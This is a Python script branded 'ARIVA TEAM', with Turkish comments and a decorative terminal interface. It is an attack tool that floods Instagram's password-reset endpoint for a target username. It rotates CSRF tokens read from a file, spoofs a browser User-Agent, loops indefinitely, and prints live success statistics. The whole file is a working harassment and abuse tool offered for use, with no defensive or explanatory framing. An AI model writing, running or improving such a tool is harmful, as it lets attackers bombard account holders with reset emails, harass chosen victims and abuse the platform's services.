import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
from pyfiglet import Figlet
from itertools import cycle

class AdvancedInstagramTool:
    def __init__(self):
        self.colors = cycle(['red', 'yellow', 'green', 'cyan', 'magenta'])
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'avg_time': 0
        }
        
        # Özel ASCII Banner
        self.banner = Figlet(font='slant').renderText('ARIVA  TEAM')
        self.sub_banner = colored("""
           █▀█ █ █▀▀ █▀█ █▀▄▀█ █▀▀   █▀▄ █▀▀ █▀▀ ▀█▀ █▀▀ █▀█
           █▀▄ █ █▄▄ █▄█ █ ▀ █ ██▄   █▄▀ ██▄ █▄▄  █  ██▄ █▀▄
        """, 'cyan')
        
        # Animasyonlu yükleme çerçeveleri
        self.spinner_frames = cycle([
            "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"
        ])
        
    def animated_header(self):
        """Animasyonlu başlık gösterimi"""
        sys.stdout.write("\033[H\033[J")  # Ekranı temizle
        for i, line in enumerate(self.banner.split('\n')):
            color = next(self.colors)
            printed_line = ''
            for char in line:
                printed_line += colored(char, color)
                sys.stdout.write(f"\r{printed_line}")
                sys.stdout.flush()
                time.sleep(0.001)
            print()
        print(self.sub_banner)
        print(colored("━"*60, 'blue'))

    def show_stats(self):
        """Real-time istatistik paneli"""
        success_rate = (self.stats['success']/self.stats['total']*100) if self.stats['total'] > 0 else 0
        stats_text = f"""
        {colored('REAL-TIME STATS', 'white', attrs=['bold'])}
        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        {colored('● Total Requests:', 'cyan')} {self.stats['total']}
        {colored('● Successful:', 'green')} {self.stats['success']}
        {colored('● Failed:', 'red')} {self.stats['failed']}
        {colored('● Success Rate:', 'yellow')} {success_rate:.2f}%
        {colored('● Avg Response:', 'magenta')} {self.stats['avg_time']:.2f}ms
        """
        sys.stdout.write("\033[7A")  # İmleci yukarı taşı
        print(colored(stats_text, attrs=['bold']))

    def spinning_cursor(self):
        """Dönen animasyon göstergesi"""
        sys.stdout.write(next(self.spinner_frames))
        sys.stdout.flush()
        sys.stdout.write('\b')

    def send_request(self, username, token):
        try:
            start = time.time()
            response = requests.post(
                "https://www.instagram.com/accounts/password/reset/",
                data={"username_or_email": username},
                headers={
                    "X-CSRFToken": token,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                },
                timeout=3
            )
            latency = (time.time() - start) * 1000
            self.stats['avg_time'] = (self.stats['avg_time'] + latency) / 2
            
            return {
                "success": response.status_code == 200,
                "token": token,
                "latency": latency,
                "status": response.status_code
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def print_result(self, result):
        """Sonuçları özel kutucuklarla göster"""
        self.stats['total'] += 1
        
        if result.get('success'):
            self.stats['success'] += 1
            status = colored("✓ SUCCESS", 'green', attrs=['bold'])
            details = f"{result['token']} | {result['latency']:.2f}ms"
        else:
            self.stats['failed'] += 1
            status = colored("✗ FAILED", 'red', attrs=['bold'])
            details = f"{result.get('error', 'Unknown error')} | Code: {result.get('status', 'N/A')}"

        box_top = colored("┌" + "─"*58 + "┐", 'blue')
        box_middle = colored("│", 'blue') + f"  {status}  {details}".ljust(58) + colored("│", 'blue')
        box_bottom = colored("└" + "─"*58 + "┘", 'blue')
        
        print(f"\n{box_top}\n{box_middle}\n{box_bottom}")

    def start_attack(self, username, tokens):
        """Çoklu thread ile saldırı başlat"""
        with ThreadPoolExecutor(max_workers=5) as executor:
            try:
                while True:
                    for token in tokens:
                        future = executor.submit(self.send_request, username, token)
                        result = future.result()
                        self.print_result(result)
                        self.show_stats()
                        self.spinning_cursor()
            except KeyboardInterrupt:
                print(colored("\n\n[!] Operation stopped by user", 'red'))
                sys.exit(0)

    def run(self):
        """Ana çalıştırıcı"""
        self.animated_header()
        
        try:
            username = input(colored("\n[?] Enter target username: ", 'yellow', attrs=['bold']))
            tokens = self.load_tokens()
            
            print(colored(f"\n[!] Starting attack against: @{username}", 'red', attrs=['bold']))
            print(colored(f"[!] Loaded {len(tokens)} CSRF tokens\n", 'cyan'))
            time.sleep(1)
            
            self.start_attack(username, tokens)
        except Exception as e:
            print(colored(f"\n[!] Critical error: {e}", 'red'))

    def load_tokens(self):
        """Token yükleme fonksiyonu"""
        try:
            with open('csrf.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(colored("[!] csrf.txt file not found!", 'red'))
            sys.exit(1)

if __name__ == "__main__":
    tool = AdvancedInstagramTool()
    tool.run()
